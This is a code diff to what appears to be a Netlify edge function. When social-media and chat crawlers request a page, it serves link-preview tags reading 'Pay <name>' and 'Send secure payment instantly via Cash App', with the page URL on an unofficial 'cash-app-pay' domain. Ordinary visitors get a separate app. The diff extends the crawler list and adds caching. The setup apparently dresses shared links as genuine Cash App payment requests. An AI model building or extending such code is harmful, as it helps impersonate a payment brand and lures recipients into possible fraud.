@@ -1,25 +1,23 @@
 export default async (request, context) => {
   const url = new URL(request.url);
-  const path = url.pathname.replace(/^\//, ''); // e.g. "atasha"
-  
-  // API routes বা অন্য path বাদ দিন
+  const path = url.pathname.replace(/^\//, '');
+
   if (!path || path.includes('.') || path.startsWith('api')) {
     return context.next();
   }
 
   const ua = request.headers.get('user-agent') || '';
-  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|LinkedInBot|SkypeUriPreview|Slackbot/i.test(ua);
+  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|LinkedInBot|SkypeUriPreview|Slackbot|Discordbot/i.test(ua);
 
   if (!isBot) {
-    return context.next(); // সাধারণ ইউজার → React app
+    return context.next();
   }
 
   const username = path.split('/')[0];
   const formattedName = username.charAt(0).toUpperCase() + username.slice(1);
+
   const title = `Pay ${formattedName}`;
   const description = `Send secure payment instantly via Cash App.`;
-  
-  // Image backend (Vercel) থেকে
   const previewImageUrl = `https://thunder-m-r18p.vercel.app/og/${encodeURIComponent(username)}`;
   const currentUrl = `https://cash-app-pay.netlify.app/${username}`;
 
@@ -43,11 +41,16 @@ export default async (request, context) => {
   <meta name="twitter:description" content="${description}" />
   <meta name="twitter:image" content="${previewImageUrl}" />
 </head>
-<body><p>${title}</p></body>
+<body>
+  <p>${title}</p>
+</body>
 </html>`;
 
   return new Response(html, {
-    headers: { 'Content-Type': 'text/html; charset=utf-8' }
+    headers: {
+      'Content-Type': 'text/html; charset=utf-8',
+      'Cache-Control': 'public, max-age=3600'
+    }
   });
 };
 
